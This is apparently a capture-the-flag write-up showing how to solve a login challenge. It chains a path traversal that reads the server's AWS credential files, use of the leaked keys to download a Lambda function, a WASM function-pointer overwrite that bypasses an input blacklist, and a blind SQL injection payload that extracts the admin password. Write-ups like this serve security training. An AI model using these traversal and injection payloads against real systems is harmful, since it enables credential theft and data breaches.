# Intended Solution

The flag is the password of the admin user. The username and password fields of the login page only allow alphabetical inputs only. Any numerical characters or symbols are blacklisted by a lambda function.

## Part 1: LFI to leak AWS credentials

After logging in with bobby's credentials, the user is brought to a page with a form to create a reminder. The form includes a text input for a reminder, the name of the user, and the view type of the reminder. The viewType parameter is unsanitized and can be used to load any file.

Looking at the provided server.js, we can see `process.env.AWS_SDK_LOAD_CONFIG = 1;`, which indicates that the AWS credentials are stored in the .aws folder in the home directory. Simply replacing the viewType parameter with `../../../../../../../../root/.aws/credentials` and `../../../../../../../../root/.aws/config` will raise errors like these:

```html
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Error: ../../../../../../../../root/.aws/credentials:1:1<br> &nbsp;&gt; 1| [default]<br>-------^<br> &nbsp; &nbsp;2| aws_access_key_id = SOME_KEY_HERE<br> &nbsp; &nbsp;3| aws_secret_access_key = SOME_OTHER_KEY_HERE<br><br>unexpected text &quot;[defa&quot;<br> &nbsp; &nbsp;at makeError (/app/node_modules/pug-error/index.js:34:13)<br> &nbsp; &nbsp;at Lexer.error (/app/node_modules/pug-lexer/index.js:62:15)<br> &nbsp; &nbsp;at Lexer.fail (/app/node_modules/pug-lexer/index.js:1629:10)<br> &nbsp; &nbsp;at Lexer.advance (/app/node_modules/pug-lexer/index.js:1694:12)<br> &nbsp; &nbsp;at Lexer.callLexerFunction (/app/node_modules/pug-lexer/index.js:1647:23)<br> &nbsp; &nbsp;at Lexer.getTokens (/app/node_modules/pug-lexer/index.js:1706:12)<br> &nbsp; &nbsp;at lex (/app/node_modules/pug-lexer/index.js:12:42)<br> &nbsp; &nbsp;at Object.lex (/app/node_modules/pug/lib/index.js:104:9)<br> &nbsp; &nbsp;at Function.loadString [as string] (/app/node_modules/pug-load/index.js:53:24)<br> &nbsp; &nbsp;at compileBody (/app/node_modules/pug/lib/index.js:82:18)</pre>
</body>
</html>
```

From this we can read off the AWS access keys and region, and use the AWS CLI to view the blacklist lambda function.

## Part 2: Enumerating and downloading lambda function

After filling in the required information after running `aws config`, we can use these commands to list and download the lambda function:

```powershell
PS C:\Users\user> aws lambda list-functions
{
    "Functions": [
        {
            "FunctionName": "craft_query",
            "FunctionArn": "arn:aws:lambda:ap-southeast-1:531845528441:function:craft_query",
            "Runtime": "nodejs18.x",
            "Role": "arn:aws:iam::531845528441:role/query",
            "Handler": "index.handler",
            "CodeSize": 26889,
            "Description": "",
            "Timeout": 3,
            "MemorySize": 128,
            "LastModified": "2023-06-06T16:15:30.000+0000",
            "CodeSha256": "QIiGvIQxqppAv1c2Z5oiiT3WXtpM1ODbyip1891ZkXQ=",
            "Version": "$LATEST",
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "f032fc4f-a894-4942-8995-80f7671bb771",
            "PackageType": "Zip",
            "Architectures": [
                "x86_64"
            ],
            "EphemeralStorage": {
                "Size": 512
            },
            "SnapStart": {
                "ApplyOn": "None",
                "OptimizationStatus": "Off"
            }
        }
    ]
}

PS C:\Users\user> wget -O craft_query.zip "$(aws lambda get-function --function-name craft_query --query 'Code.Location' --output text)"
```

Extracting the zip file, we're given 3 files: index.js, site.js, and site.wasm.

## Part 3: Function pointer overwrite in the WASM file to bypass blacklist

From the lambda handler, we see that only one function is exported from the wasm file, `craft_query`. Also, the wasm is compiled using emscripten:

```javascript
const CraftQuery = EmscriptenModule.cwrap('craft_query', 'string', ['string', 'string']);

...

const username = event.username;
const password = event.password;

const result = CraftQuery(username, password);
return result;
```

The function takes a username and password and returns a string. To analyze the wasm binary, create a test website that loads and executes `craft_query` from the wasm file for debugging with browser devtools. The JavaScript glue is designed for the node environment, so compile a test C file to wasm for the browser using Emscripten, and adapt the JavaScript glue to enable execution in a web environment.

The test website is located at `./test`. Run `python3 -m http.server 80` in the directory to access the website.

We can see that `craft_query` returns an SQL statement `SELECT * from Users WHERE username="example" AND password="example"`. On sending an input with characters other than alphabets, the function returns `Blacklisted!`. To obtain the password of the admin user, it is obvious that some form of error-based blind SQL injection is necessary, but doing so is difficult with the blacklist in place. We must take advantage of another vulnerability to carry out SQL injection.

Curiously, when sending a long input for the username, the function errors out with `Uncaught RuntimeError: memory access out of bounds`. When fuzzing the length of the username parameter, at a length of 69 characters, the error changes to `Uncaught RuntimeError: table index is out of bounds`. At a length of 68 characters, the error changes again to `Uncaught RuntimeError: null function or function signature mismatch`. Upon inspection of the wasm file in the browser's developer tools, we can see that the error occurs at the end of `craft_query` at this line:

```
call_indirect (param i32 i32) (result i32)
```

When setting a breakpoint at this line and sending legitimate parameters, stepping into this indirect call will land the program in the `is_blacklisted` function. By sending different inputs, looking at the memory via the memory inspector panel, and stepping through the code in the debugger, a few things become apparent:

1. The flow of the program is as follows: `craft_query` calls `func4` with two parameters, the second one being a pointer to the username. The username is then loaded into the address at the first parameter, and `func4` returns. It then calls `func15` on an address, the address to the password string, and the integer 59. Then, it calls `is_blacklisted` on the username and password, and `func7` is called on both the username and password separately. If `func7` returns true for both calls, `is_blacklisted` calls `load_query` with the username and password and returns its result.
2. `func4` is a loop that iterates through the string and looks for the `%` sign (37 in decimal). It then converts the next two characters into a new one. This function is a url decoder.
3. `func15` is `strncpy`.
4. `func7` iterates through the string to find any non-alphabetical characters, and returns false if detected.
5. The call to `is_blacklisted` is indirect and the function pointer is stored in memory.

The runtime errors seen previously was the result of the function pointer being overwritten by the username. By overwriting the pointer with the `load_query` function, we can bypass the blacklist function entirely. Doing

```
username=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%02
```

will overwrite the function pointer with the index of the `load_query` function in the function table 0x02 after being url decoded. Since `load_query` also takes in two string arguments, this overwrite doesn't error out.

## Part 4: Integrating the overwrite with SQLi

Integrating this with a standard SQLi payload, we can craft a new payload to allow for exploitation on the server. There are a few things to take note of:

1. Query cannot extend past 69 characters.
2. When enumerating past the 9th character, the length of padding at the end of the query must be adjusted to account for the change in number length.
3. The `BINARY` keyword must be used for case-sensitive comparison.

An example payload that works is:

```sql
admin" AND (SELECT BINARY SUBSTR(password,1,1) LIMIT 1)="P" --      %02
```

The full exploit script is in expl.py.